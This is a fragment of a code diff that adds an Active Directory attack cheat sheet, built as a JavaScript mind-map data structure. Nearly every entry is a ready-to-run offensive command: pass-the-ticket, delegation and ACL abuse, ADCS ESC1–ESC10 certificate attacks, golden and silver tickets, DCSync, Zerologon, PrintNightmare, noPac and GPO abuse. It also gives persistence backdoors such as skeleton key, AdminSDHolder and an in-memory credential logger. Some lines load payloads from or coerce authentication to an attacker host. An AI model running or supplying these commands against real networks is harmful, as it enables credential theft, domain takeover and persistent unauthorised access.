+      c('CME mssql PTH',"cme mssql DC_IP/24 -H ':NTHASH'"),
+      c('mssqlclient PTH','mssqlclient.py -windows-auth -hashes :NTHASH domain.local/user@DC_IP'),
+    ]),
+  ]),
+  h('Pass the Ticket (PTT)',[
+    c('Rubeus PTT','Rubeus.exe ptt /ticket:<base64_ticket>'),
+    c('Rubeus PTT by LUID','Rubeus.exe ptt /luid:0xdeadbeef /ticket:<ticket>'),
+    c('mimikatz PTT','mimikatz "kerberos::ptc ticket.kirbi"'),
+    c('set KRB5CCNAME','export KRB5CCNAME=/path/to/ticket.ccache'),
+    c('impacket use ticket','# Add -k -no-pass to any impacket tool with KRB5CCNAME set'),
+    c('proxychains secretsdump PTT',"proxychains secretsdump -k 'domain.local'/'user'@'DC_IP'"),
+    c('ticketConverter kirbi→ccache','ticketConverter.py ticket.kirbi ticket.ccache'),
+    c('tgssub modify SPN','tgssub.py -in ticket.ccache -out new.ccache -altservice "cifs/target"'),
+  ]),
+  h('Overpass the Hash (PTK)',[
+    c('Rubeus asktgt RC4','Rubeus.exe asktgt /user:user /rc4:NTHASH /domain:domain.local /ptt'),
+    c('Rubeus asktgt AES256','Rubeus.exe asktgt /user:user /aes256:AESKEY /domain:domain.local /ptt'),
+    c('Rubeus createnetonly','Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe'),
+    c('getTGT.py NTLM','getTGT.py domain.local/user -hashes :NTHASH'),
+    c('getTGT.py AES','getTGT.py -aesKey AES256KEY domain.local/user@DC_IP'),
+    c('impacket aesKey flag','# Add -aesKey AES256KEY to impacket tools (must use FQDN)'),
+  ]),
+  h('Cleartext Credential Exec',[
+    c('psexec.py','psexec.py domain.local/user:pass@DC_IP'),
+    c('smbexec.py','smbexec.py domain.local/user:pass@DC_IP'),
+    c('wmiexec.py','wmiexec.py domain.local/user:pass@DC_IP'),
+    c('atexec.py','atexec.py domain.local/user:pass@DC_IP "whoami"'),
+    c('dcomexec.py','dcomexec.py domain.local/user:pass@DC_IP'),
+    c('evil-winrm','evil-winrm -i DC_IP -u user -p pass'),
+    c('xfreerdp','xfreerdp /u:user /d:domain.local /p:pass /v:DC_IP'),
+    c('smbclient.py','smbclient.py domain.local/user:pass@DC_IP'),
+    c('psexec.exe','psexec.exe -AcceptEULA \\\\DC_IP'),
+    c('CME smb exec','cme smb DC_IP/24 -u user -p pass -d domain.local'),
+  ]),
+  h('Pass the Certificate',[
+    c('certipy auth get NTLM','certipy auth -pfx cert.pfx -dc-ip DC_IP'),
+    c('gettgtpkinit','gettgtpkinit.py -cert-pfx cert.pfx domain.local/user ticket.ccache'),
+    c('Rubeus asktgt cert','Rubeus.exe asktgt /user:user /certificate:cert.pfx /domain:domain.local /dc:DC_IP /show'),
+    c('Schannel ldap-shell','certipy auth -pfx cert.pfx -ldap-shell'),
+    c('Schannel add_computer','# certipy auth -pfx cert.pfx -ldap-shell → add_computer, set_rbcd'),
+  ]),
+  h('RDP Session Hijacking',[
+    c('query user sessions','query user'),
+    c('tscon hijack (no password)','cmd /k tscon <session_id> /dest:console'),
+    c('psexec get SYSTEM','psexec -s -i cmd'),
+    nt('Must run as SYSTEM; allows hijack of any RDP session without knowing password'),
+  ]),
+  h('MSSQL Lateral Movement',[
+    c('Find MSSQL','cme mssql DC_IP/24 -u user -p pass -d domain.local'),
+    c('BH SQLAdmin query','MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p'),
+    c('mssqlclient.py','mssqlclient.py -windows-auth domain.local/user:pass@DC_IP'),
+    c('enum_db','# mssqlclient> enum_db'),
+    c('enable xp_cmdshell',"EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;"),
+    c('exec via xp_cmdshell',"EXEC xp_cmdshell 'whoami'"),
+    c('coerce via xp_dirtree',"EXEC xp_dirtree '\\\\<attacker_ip>\\share'"),
+    c('link crawl PS','Get-SQLServerLinkCrawl -username user -password pass -Verbose -Instance sql_instance -Query "whoami"'),
+    c('link crawl MSF','use exploit/windows/mssql/mssql_linkcrawler'),
+    c('enum impersonate','# mssqlclient> enum_impersonate; exec_as_user user; exec_as_login login'),
+    c('sp_linkedservers','# EXEC sp_linkedservers'),
+    c('use_link in msf','# mssqlclient> use_link LINKED_SERVER'),
+  ]),
+  h('WinRM / PowerShell Remoting',[
+    c('evil-winrm','evil-winrm -i DC_IP -u user -p pass'),
+    c('evil-winrm hash','evil-winrm -i DC_IP -u user -H NTHASH'),
+    c('PSRemoting Enter','Enter-PSSession -ComputerName TARGET -Credential domain.local\\user'),
+    c('PSRemoting Invoke','Invoke-Command TARGET -ScriptBlock {whoami}'),
+    c('CME winrm','cme winrm DC_IP -u user -p pass -x "whoami"'),
+  ]),
+  h('SCCM / WSUS Abuse',[
+    c('SharpSCCM info','SharpSCCM.exe get site-info'),
+    c('CMPivot','# CMPivot for code exec on all managed endpoints as SCCM admin'),
+    c('WSUSpendu','WSUSpendu.ps1'),
+    nt('SCCM admin rights → deploy software → SYSTEM on all managed machines'),
+  ]),
+]},
+
+{id:'kerbdel',label:'8. Kerberos Delegation',color:'#aed581',x:1680,y:500,parent:null,items:[
+  h('Enumerate Delegations',[
+    c('findDelegation.py','findDelegation.py domain.local/user:pass@DC_IP'),
+    c('ldeep delegations','ldeep ldap -u user -p pass -d domain.local -s ldap://DC_IP delegations'),
+    c('BH shortestPath','MATCH (u:User {owned:true}),(c:Computer),p=shortestPath((u)-[*1..]->(c)) RETURN p'),
+  ]),
+  h('Unconstrained Delegation',[
+    c('Find unconstrained PV','Get-DomainComputer -Unconstrained -Properties DnsHostName'),
+    c('BH query','MATCH (c:Computer {unconstraineddelegation:true}) RETURN c'),
+    c('Rubeus monitor for TGTs','Rubeus.exe monitor /interval:5 /nowrap'),
+    c('Rubeus dump TGT','Rubeus.exe dump /service:krbtgt /nowrap'),
+    c('mimikatz export tickets','mimikatz "privilege::debug" "sekurlsa::tickets /export"'),
+    c('Rubeus dump by LUID','Rubeus.exe dump /luid:0xdeadbeef /nowrap'),
+    nt('Coerce DC auth (PetitPotam/PrinterBug) → TGT cached on compromised host → inject → DCSync'),
+    c('Rubeus PTT inject','Rubeus.exe ptt /ticket:<ticket>'),
+  ]),
+  h('Constrained Delegation (with protocol transition)',[
+    c('Find users TrustedToAuth','Get-DomainUser -TrustedToAuth'),
+    c('Find comps TrustedToAuth','Get-DomainComputer -TrustedToAuth -Properties DnsHostName,MSDS-AllowedToDelegateTo'),
+    c('BH constrained','MATCH (c:Computer),(t:Computer),p=((c)-[:AllowedToDelegate]->(t)) RETURN p'),
+    c('Rubeus hash from password','Rubeus.exe hash /password:PASS'),
+    c('Rubeus asktgt','Rubeus.exe asktgt /user:user /domain:domain.local /aes256:AESKEY'),
+    c('Rubeus s4u impersonate','Rubeus.exe s4u /ticket:<tgt> /impersonateuser:Administrator /msdsspn:<constrained_spn> /altservice:CIFS /ptt'),
+    nt('altservice: HOST→psexec, HTTP→PSRemoting, CIFS→ls shares, LDAP→DCSync'),
+  ]),
+  h('Constrained Delegation (without proto transition → RBCD path)',[
+    c('addcomputer for RBCD','addcomputer.py -computer-name RBCD$ -computer-pass RBCDpass -dc-ip DC_IP domain.local/user:pass'),
+    c('rbcd write access','rbcd.py -delegate-from RBCD$ -delegate-to constrained$ -dc-ip DC_IP -action write -hashes :NTHASH domain.local/constrained$'),
+    c('getST self S4U','getST.py -self -impersonate "administrator" -dc-ip DC_IP domain.local/RBCD$:RBCDpass'),
+    c('getST s4u constrained','getST.py -spn host/constrained -hashes "" domain.local/comp$ -impersonate Administrator --dc-ip DC_IP -additional-ticket prev.ccache'),
+  ]),
+  h('RBCD (Resource-Based Constrained Delegation)',[
+    c('rbcd.py write','rbcd.py -delegate-from COMP$ -delegate-to target$ -dc-ip DC_IP -action write domain.local/user:pass'),
+    c('Rubeus hash','rubeus.exe hash /password:COMPPASS /user:COMP$ /domain:domain.local'),
+    c('Rubeus s4u RBCD','rubeus.exe s4u /user:COMP$ /aes256:AES256HASH /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt'),
+    c('getST impersonate','getST.py -spn host/DC_FQDN domain.local/COMP$:COMPPASS -impersonate Administrator --dc-ip DC_IP'),
+    c('addcomputer','addcomputer.py -computer-name COMP$ -computer-pass COMPPASS -dc-host DC_IP -domain-netbios DOMAIN domain.local/user:pass'),
+    nt('Requires: GenericWrite/GenericAll on computer, or adding computer account (MachineAccountQuota)'),
+  ]),
+  h('Self RBCD (KrbRelayUp)',[
+    c('KrbRelayUp relay','.\\KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName COMP$ -ComputerPassword pass'),
+    c('KrbRelayUp spawn','./KrbRelayUp.exe spawn -m rbcd -d domain.local -dc DC_IP -cn COMP$ -cp pass'),
+    nt('No admin required on local machine; escalates to SYSTEM via RBCD chain'),
+  ]),
+]},
+
+{id:'acl',label:'9. ACL / Object Abuse',color:'#ffab91',x:300,y:900,parent:null,items:[
+  h('ACL Discovery',[
+    c('BH outbound control','# BloodHound: Outbound Object Control on owned nodes'),
+    c('Find-InterestingDomainAcl','Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReferenceName,AceType,ActiveDirectoryRights -Unique'),
+    c('Get-DomainObjectAcl','Get-DomainObjectAcl -SamAccountName TARGET -ResolveGUIDs'),
+    c('acltoolkit','acltoolkit domain.local/user:pass@DC_IP get-objectacl [-all | -object TARGET]'),
+    c('aclpwn auto-exploit','aclpwn.py -f user -t "Domain Admins" -d domain.local -s DC_IP'),
+  ]),
+  h('GenericAll / GenericWrite on User',[
+    c('Change password (net user)','net user TARGET NEWPASS /domain'),
+    c('Add SPN (kerberoast)',"Set-DomainObject -Identity TARGET -Set @{serviceprincipalname='svc/fake'}"),
+    c('targetedKerberoast','targetedKerberoast.py -d domain.local -u user -p pass'),
+    c('Add KeyCredential (Whisker)','Whisker.exe add /target:TARGET'),
+    c('pywhisker add','pywhisker.py -d domain.local -u user -p pass --target TARGET --action add'),
+    c('certipy shadow auto',"certipy shadow auto -u user@domain.local -p pass -account TARGET"),
+    c('Set logon script','Set-DomainObject TARGET -Set @{scriptpath="\\\\attacker\\share\\script.ps1"}'),
+  ]),
+  h('ForceChangePassword',[
+    c('net rpc password','net rpc password TARGET NEWPASS -S DC_FQDN'),
+    c('net user /domain','net user TARGET NEWPASS /domain'),
+    c('PowerView Set-Password','Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString "Pass1!" -AsPlainText -Force)'),
+  ]),
+  h('GenericAll / GenericWrite on Group',[
+    c('net group add member','net group "GROUP" myuser /add /domain'),
+    c('ldeep add to group','ldeep ldap -u user -p pass -d domain.local -s ldap://DC_IP add_to_group "CN=user,DC=domain,DC=local" "CN=group,DC=domain,DC=local"'),
+    c('Add-DomainGroupMember','Add-DomainGroupMember -Identity GROUP -Members myuser'),
+    c('WriteProperty Self-Membership','# Set-DomainObject -Identity GROUP -Set @{member="CN=user,..."}'),
+  ]),
+  h('WriteOwner / WriteDACL',[
+    c('owneredit take ownership','owneredit.py domain.local/user:pass@DC_IP -target TARGET -new-owner user'),
+    c('dacledit grant GenericAll','dacledit.py domain.local/user:pass@DC_IP -target TARGET -rights FullControl -ace-type allowed -principal user'),
+    c('dacledit grant DCSync','dacledit.py domain.local/user:pass@DC_IP -target-dn "DC=domain,DC=local" -rights DCSync -ace-type allowed -principal user'),
+    nt('Take ownership first → grant yourself GenericAll → abuse (reset pass, add to group, etc)'),
+  ]),
+  h('GenericAll on Computer',[
+    c('Shadow credentials','certipy shadow auto -u user@domain.local -p pass -account TARGET$'),
+    c('pywhisker computer','pywhisker.py -d domain.local -u user -p pass --target TARGET$ --action add'),
+    c('Set RBCD attribute','# Set msDS-AllowedToActOnBehalfOfOtherIdentity via rbcd.py'),
+  ]),
+  h('Shadow Credentials (needs ADCS)',[
+    c('Whisker.exe','Whisker.exe add /target:TARGET'),
+    c('pywhisker list','pywhisker.py -d domain.local -u user -p pass --target TARGET --action list'),
+    c('certipy shadow',"certipy shadow auto -u user@domain.local -p pass -account TARGET"),
+    c('get NT hash from cert','certipy auth -pfx TARGET.pfx -dc-ip DC_IP'),
+    nt('Modifies msDS-KeyCredentialLink attribute → get TGT via PKINIT → NT hash'),
+  ]),
+  h('dcsync via ACL',[
+    c('dacledit grant DCSync rights','dacledit.py domain.local/user:pass@DC_IP -target-dn "DC=domain,DC=local" -rights DCSync -ace-type allowed -principal user'),
+    c('mimikatz dcsync','mimikatz "lsadump::dcsync /domain:domain.local /user:domain.local\\administrator"'),
+    c('secretsdump',"secretsdump.py 'domain.local'/'user':'pass'@'DC_IP'"),
+  ]),
+  h('AdminSDHolder Backdoor',[
+    c('Add ACL to AdminSDHolder','Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity backdoor -Rights All'),
+    c('Trigger SDProp early','Invoke-ADSDPropagation'),
+    nt('SDProp runs every 60min → propagates ACL to all protected objects (DA, EA, Admins...)'),
+    nt('Persistent backdoor: survives even if removed from DA group'),
+  ]),
+  h('LAPS Password Reading',[
+    c('BH LAPS readers','MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p'),
+    c('Get-LAPSPasswords','Get-LAPSPasswords -DomainController DC_IP -Credential domain.local\\user | Format-Table -AutoSize'),
+    c('CME LAPS','cme ldap DC_IP -d domain.local -u user -p pass --module laps'),
+    c('MSF LAPS','use post/windows/gather/credentials/enum_laps'),
+    c('ldapsearch ms-Mcs-AdmPwd','ldapsearch -x -h DC_IP -D user@domain.local -W -b "DC=domain,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" ms-Mcs-AdmPwd'),
+    c('PowerView LAPS','Get-DomainComputer -Filter {ms-Mcs-AdmPwd=*} | select name,ms-Mcs-AdmPwd'),
+  ]),
+  h('gMSA Abuse',[
+    c('Find gMSA','Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword'),
+    c('Read gMSA password','Get-ADServiceAccount -Identity GMSA -Properties msDS-ManagedPassword'),
+    c('GMSAPasswordReader','GMSAPasswordReader.exe --AccountName GMSA'),
+    c('BH gMSA','MATCH p=(n)-[:ReadGMSAPassword]->(m:User) RETURN p'),
+    nt('Extract NTLM hash from msDS-ManagedPassword blob → PTH'),
+  ]),
+]},
+
+{id:'adcs',label:'10. ADCS Certificate Attacks',color:'#80cbc4',x:760,y:880,parent:null,items:[
+  h('Enumeration',[
+    c('certipy find','certipy find -u user@domain.local -p pass -dc-ip DC_IP'),
+    c('certipy find vuln only','certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable'),
+    c('certify find vuln','certify.exe find /vulnerable'),
+    c('certutil templates','certutil -v -dsTemplate'),
+    c('certutil CA info','certutil -TCAInfo'),
+    c('certutil CA flags','certutil -config "CA_HOST\\CA_NAME" -getreg "policy\\EditFlags"'),
+    c('certify pkiobjects','certify.exe pkiobjects'),
+    c('certify cas','certify.exe cas'),
+  ]),
+  h('ESC1 – Vulnerable Template (SAN)',[
+    c('certipy req ESC1',"certipy req -u user@domain.local -p pass -target CA_SERVER -template 'VULN_TEMPLATE' -ca CA_NAME -upn administrator@domain.local"),
+    c('certify req ESC1','certify.exe request /ca:CA_SERVER\\CA_NAME /template:"VULN_TEMPLATE" /altname:"administrator"'),
+    c('certipy auth → NTLM hash','certipy auth -pfx cert.pfx -dc-ip DC_IP'),
+    nt('Conditions: template allows SAN specification + client auth EKU + low-priv enrollment rights'),
+  ]),
+  h('ESC2 – Any Purpose EKU',[
+    nt('Template has Any Purpose EKU or no EKU → use like ESC3 enrollment agent template'),
+    c('Exploit like ESC3','# Use ESC2 template as enrollment agent → request on behalf of any user'),
+  ]),
+  h('ESC3 – Enrollment Agent Abuse',[
+    c('Step1: req agent cert',"certipy req -u user@domain.local -p pass -target CA_SERVER -template 'ENROLLMENT_AGENT_TEMPLATE' -ca CA_NAME"),
+    c('Step2: req on behalf of',"certipy req -u user@domain.local -p pass -target CA_SERVER -template 'TEMPLATE' -ca CA_NAME -on-behalf-of 'domain\\administrator' -pfx agent.pfx"),
+    c('certify step1','certify.exe request /ca:CA_SERVER\\CA_NAME /template:"VULN_TEMPLATE"'),
+    c('certify step2','certify.exe request /ca:CA_SERVER\\CA_NAME /template:User /onbehalfof:domain\\administrator /enrollcert:agent.pfx'),
+  ]),
+  h('ESC4 – Write Privilege on Template',[
+    c('certipy save-old template',"certipy template -u user@domain.local -p 'pass' -template VULN_TEMPLATE -save-old -debug"),
+    c('Exploit modified template as ESC1','# Template now allows SAN → proceed with ESC1 attack'),
+    c('Restore template',"certipy template -u user@domain.local -p 'pass' -template VULN_TEMPLATE -configuration TEMPLATE.json"),
+  ]),
+  h('ESC5 – Vulnerable PKI ACL',[
+    c('certify pkiobjects','certify.exe pkiobjects'),
+    nt('Misconfigured ACL on CA, AIA, NTAuthCertificates, RootCA etc → write to template → ESC4 chain'),
+  ]),
+  h('ESC6 – ATTRIBUTESUBJECTALTNAME2 flag',[
+    c('Check EDITF flag','certutil -config "CA_HOST\\CA_NAME" -getreg "policy\\EditFlags"'),
+    nt('EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA → any client auth template vulnerable like ESC1'),
+    c('certipy or certify ESC1 method','# Use any client-auth template as ESC1'),
+  ]),
+  h('ESC7 – Vulnerable CA Permissions',[
+    c('Add self as officer',"certipy ca -ca CA_NAME -add-officer 'user' -username user@domain.local -password pass"),
+    c('Enable ESC1-like template',"certipy ca -ca CA_NAME -enable-template 'VULN_TEMPLATE' -username user@domain.local -password pass"),
+    c('Request cert',"certipy req -username user@domain.local -password pass -ca CA_NAME -template 'VULN_TEMPLATE' -upn administrator@domain.local"),
+    c('Issue pending request',"certipy ca -u user@domain.local -p 'pass' -ca CA_NAME -issue-request <request_id>"),
+    c('Retrieve cert',"certipy req -u user@domain.local -p 'pass' -ca CA_NAME -retrieve <request_id>"),
+    c('Pass the Certificate','certipy auth -pfx cert.pfx -dc-ip DC_IP'),
+  ]),
+  h('ESC8 – NTLM Relay to ADCS Web',[
+    c('Check web enrollment up','# http://CA_SERVER/certsrv/ should return 200'),
+    c('ntlmrelayx ADCS','ntlmrelayx.py -t http://DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController'),
+    c('certipy relay','certipy relay -ca DC_IP -template DomainController'),
+    c('Rubeus use b64 cert','Rubeus.exe asktgt /user:DC$ /certificate:<base64> /ptt'),
+    c('gettgtpkinit','gettgtpkinit.py -pfx-base64 $(cat cert.b64) domain.local/DC$ ticket.ccache'),
+    c('certipy auth','certipy auth -pfx cert.pfx -dc-ip DC_IP'),
+    nt('Coerce DC auth (PetitPotam/PrinterBug) → relay to ADCS CA → DC cert → PTT → DCSync'),
+  ]),
+  h('ESC9 / ESC10 – Certificate Mapping',[
+    c('certipy shadow auto first',"certipy shadow auto -username accountA@domain.local -p passA -account accountB"),
+    c('ESC9: update UPN','certipy account update -username accountA@domain.local -password passA -user accountB -upn Administrator'),
+    c('ESC9: req cert',"certipy req -username accountB@domain.local -hashes HASH -ca CA_NAME -template VULN_TEMPLATE"),
+    c('ESC10 case1: update UPN',"certipy account update -username accountA@domain.local -password passA -user accountB -upn Administrator"),
+    c('ESC10 case2: UPN to DC$',"certipy account update -username accountA@domain.local -password passA -user accountB -upn 'DC$@domain.local'"),
+    c('Reset UPN after ESC10','certipy account update -username accountA@domain.local -password passA -user accountB -upn accountB@domain.local'),
+  ]),
+  h('Golden Certificate (Persistence)',[
+    c('Backup CA private key',"certipy ca -backup -ca 'CA_NAME' -username user@domain.local -hashes :NTHASH"),
+    c('Forge cert offline',"certipy forge -ca-pfx ca_private_key.pfx -upn administrator@domain.local -subject 'CN=administrator,CN=Users,DC=domain,DC=local'"),
+    c('certipy auth from forged','certipy auth -pfx forged.pfx -dc-ip DC_IP'),
+    nt('Offline persistence: forge certs for ANY user ANYTIME without touching the CA again'),
+  ]),
+]},
+
+{id:'kerbtix',label:'11. Kerberos Ticket Attacks',color:'#b39ddb',x:1220,y:860,parent:null,items:[
+  h('Golden Ticket',[
+    c('mimikatz golden (AES)','mimikatz "kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /aes256:KRBTGT_AES256 /ptt"'),
+    c('mimikatz golden (NTLM)','mimikatz "kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM /ptt"'),
+    c('ticketer.py','ticketer.py -aesKey AESKEY -domain-sid DOMAIN_SID -domain domain.local goldenuser'),
+    c('Get KRBTGT via dcsync','mimikatz "lsadump::dcsync /domain:domain.local /user:domain.local\\krbtgt"'),
+    c('Get domain SID','lookupsid.py domain.local/user:pass@DC_IP 0'),
+    nt('Valid until KRBTGT password changed TWICE; bypasses password resets for the target user'),
+  ]),
+  h('Silver Ticket',[
+    c('mimikatz silver','mimikatz "kerberos::golden /sid:USER_SID /domain:DOMAIN_SID /target:TARGET /service:cifs /aes256:COMPUTER_AES256 /user:Administrator /ptt"'),
+    c('ticketer.py silver','ticketer.py -nthash MACHINE_NT_HASH -domain-sid DOMAIN_SID -domain domain.local -spn cifs/TARGET Administrator'),
+    nt('Forged TGS for specific service; no DC contact needed; hard to detect'),
+    nt('Services: CIFS (file), HOST (psexec), HTTP (WinRM), LDAP (dcsync), RPCSS, MSSQLSvc'),
+  ]),
+  h('Diamond Ticket',[
+    c('Rubeus diamond','Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512 /nowrap'),
+    nt('Modifies real TGT PAC instead of forging → less detectable than Golden Ticket'),
+  ]),
+  h('DCSync',[
+    c('mimikatz dcsync all','mimikatz "lsadump::dcsync /domain:domain.local /all /csv"'),
+    c('mimikatz dcsync user','mimikatz "lsadump::dcsync /domain:domain.local /user:domain.local\\administrator"'),
+    c('secretsdump',"secretsdump.py 'domain.local'/'user':'pass'@'DC_IP'"),
+    c('secretsdump NTLM only',"secretsdump.py 'domain.local'/'user':'pass'@'DC_IP' -just-dc-ntlm"),
+    nt('Requires: Domain Admin, Administrators, Enterprise Admins, or DCSync ACL rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)'),
+  ]),
+  h('MS14-068 Privilege Escalation',[
+    c('wmic lookupnames','wmic useraccount get name,sid'),
+    c('rpcclient lookupnames','rpcclient $> lookupnames username'),
+    c('goldenPac.py',"goldenPac.py -dc-ip DC_IP domain.local/user:'pass'@target"),
+    c('MSF kerberos check','auxiliary/admin/kerberos/ms14_068_kerberos_checksum'),
+    nt('Allows any domain user to elevate to DA on unpatched systems'),
+  ]),
+  h('SamAccountName (noPac) CVE-2021-42278/42287',[
+    c('CME noPac scan','cme smb DC_IP -u user -p pass -M nopac'),
+    c('noPac.exe','.\\noPac.exe -domain domain.local -user user -pass pass /dc DC_FQDN /mAccount machine /mPassword machpass /service cifs /ptt'),
+    c('impacket flow','# addcomputer.py → renameMachine.py → getTGT.py → renameMachine.py → getST.py'),
+    nt('Any domain user can forge DA impersonation; addcomputer.py/renameMachine.py needed'),
+  ]),
+  h('PrintNightmare CVE-2021-1675/34527',[
+    c('CVE-2021-1675.py',"CVE-2021-1675.py domain.local/user:pass@target '\\\\<attacker_ip>\\share\\inject.dll'"),
+    c('MSF PrintNightmare','use exploit/windows/smb/printnightmare'),
+    nt('Authenticated RCE via print spooler → SYSTEM on target; works on patched systems in some configs'),
+  ]),
+  h('Certifried CVE-2022-26923',[
+    c('Create machine with DC DNS',"certipy account create -u user@domain.local -p 'pass' -user 'certifriedpc' -pass 'certifriedpass' -dns 'dc.domain.local'"),
+    c('Request Machine cert','certipy req -u certifriedpc$@domain.local -p certifriedpass -target CA_FQDN -ca CA_NAME -template Machine'),
+    c('Authenticate as DC','certipy auth -pfx cert.pfx -username dc$ -domain domain.local -dc-ip DC_IP'),
+    nt('Create computer with same DNS name as DC → get DC cert → PTT → DCSync'),
+  ]),
+  h('Zerologon CVE-2020-1472',[
+    c('Safe relay method','ntlmrelayx.py -t dcsync://DC2_IP -smb2support -auth-smb user:pass'),
+    c('zerologon scan',"zerologon-scan 'DC_NETBIOS_NAME' 'DC_IP'"),
+    c('exploit (DESTRUCTIVE)',"python3 cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> DC_IP"),
+    c('restore pass after exploit','python3 restorepassword.py -target-ip DC_IP domain.local/DC_BIOS_NAME@DC_BIOS_NAME -hexpass HEXPASS'),
+    nt('UNSAFE exploit resets DC machine account to empty password → breaks domain! Use safe relay method'),
+  ]),
+]},
+
+{id:'persist',label:'12. Persistence',color:'#e57373',x:1680,y:900,parent:null,items:[
+  h('Golden Ticket',[
+    c('mimikatz golden','mimikatz "kerberos::golden /user:Administrator /domain:domain.local /sid:DOMAIN_SID /aes256:KRBTGT_AES256 /ptt"'),
+    c('ticketer.py','ticketer.py -aesKey AESKEY -domain-sid DOMAIN_SID -domain domain.local goldenuser'),
+    nt('KRBTGT hash → forge TGT for any user; must change KRBTGT password TWICE to invalidate'),
+  ]),
+  h('DSRM Admin (DC Local Backdoor)',[
+    c('Set DSRM logon reg key','PowerShell New-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD'),
+    nt('DSRM = Directory Services Restore Mode local admin on DC; set reg key to allow network logon'),
+    c('PTH with DSRM hash','mimikatz "privilege::debug sekurlsa::pth /user:Administrator /domain:DC_HOSTNAME /ntlm:DSRM_HASH"'),
+  ]),
+  h('Skeleton Key',[
+    c('mimikatz skeleton key','mimikatz "privilege::debug" "misc::skeleton" "exit"'),
+    nt('Universal password "mimikatz" works for ALL domain accounts (memory only; non-persistent)'),
+    c('Test skeleton key auth','# Any user can now auth with password "mimikatz"'),
+  ]),
+  h('Custom SSP (Credential Logger)',[
+    c('mimikatz in-memory SSP','mimikatz "privilege::debug" "misc::memssp" "exit"'),
+    c('Log location','# C:\\Windows\\System32\\kiwissp.log'),
+    nt('Installs SSP in memory → logs ALL future domain authentications to file on DC'),
+  ]),
+  h('DCShadow',[
+    nt('Registers rogue DC → pushes malicious changes during legitimate AD replication'),
+    c('DCShadow (needs 2 mimikatz instances)','# Instance 1: lsadump::dcshadow /object:TARGET /attribute:ATTR /value:VAL'),
+    c('DCShadow push','# Instance 2 (as DA): lsadump::dcshadow /push'),
+    nt('Can inject SIDHistory, group membership, set userAccountControl → very stealthy'),
+  ]),
+  h('SID History Injection',[
+    c('mimikatz SID add','mimikatz "privilege::debug" "sid::add /sam:TARGET /new:ADMIN_SID"'),
+    c('DSReplication inject SID','# Can inject Enterprise Admin SID via DCShadow'),
+    nt('Persists in AD even if user removed from DA group; survives password reset'),
+  ]),
+  h('AdminSDHolder ACL Backdoor',[
+    c('Add ACL to AdminSDHolder','Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity backdoor -Rights All'),
+    c('Trigger SDProp now','Invoke-ADSDPropagation'),
+    nt('SDProp runs every 60min → ACL propagated to all protected objects → persistent DA-equivalent access'),
+  ]),
+  h('Add to Domain Admins',[
+    c('net group add','net group "domain admins" myuser /add /domain'),
+    c('Add-DomainGroupMember','Add-DomainGroupMember -Identity "Domain Admins" -Members backdoor'),
+  ]),
+  h('Golden Certificate',[
+    c('Backup CA key',"certipy ca -backup -ca 'CA_NAME' -username user@domain.local -hashes :NTHASH"),
+    c('Forge cert anytime',"certipy forge -ca-pfx ca.pfx -upn administrator@domain.local"),
+    c('Auth from forged cert','certipy auth -pfx forged.pfx -dc-ip DC_IP'),
+    nt('Offline persistence: forge certs for ANY user at any time without touching DC again'),
+  ]),
+  h('Scheduled Task / Service Backdoor',[
+    c('schtasks create','schtasks /create /s TARGET /sc onstart /tn "Update" /tr "C:\\backdoor.exe" /ru SYSTEM'),
+    c('sc create service','sc \\\\TARGET create backdoor binpath= "C:\\backdoor.exe" start= auto'),
+    c('New-ScheduledTask PS','Register-ScheduledTask -TaskName "Update" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute "C:\\backdoor.exe") -RunLevel Highest'),
+  ]),
+]},
+
+{id:'gpo',label:'13. GPO Abuse',color:'#90a4ae',x:300,y:1320,parent:null,items:[
+  h('Find GPO Write Access',[
+    c('BH GenericWrite on GPO','MATCH (gr:Group),(gp:GPO),p=((gr)-[:GenericWrite]->(gp)) RETURN p'),
+    c('Who can create GPOs','Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=domain,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -eq "Group-Policy-Container"} | select ObjectDN,ActiveDirectoryRights,SecurityIdentifier'),
+    c('Who can write GP-Link','Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty"} | select ObjectDN,SecurityIdentifier'),
+  ]),
+  h('Exploit GPO with Write Access',[
+    c('SharpGPOAbuse local admin','SharpGPOAbuse.exe --AddLocalAdmin --UserAccount backdoor --GPOName "VULN_GPO"'),
+    c('SharpGPOAbuse schtask','SharpGPOAbuse.exe --AddSchedTask --TaskName "Update" --Author SYSTEM --Command "C:\\beacon.exe" --GPOName "VULN_GPO"'),
+    c('pyGPOAbuse','pyGPOAbuse.py -gpo VULN_GPO -u user -p pass -d domain.local -dc DC_IP -AddLocalAdmin -username backdoor'),
+    nt('GPO changes apply to all computers/users in the linked OU at next Group Policy refresh'),
+  ]),
+  h('SYSVOL / GPP Passwords (MS14-025)',[
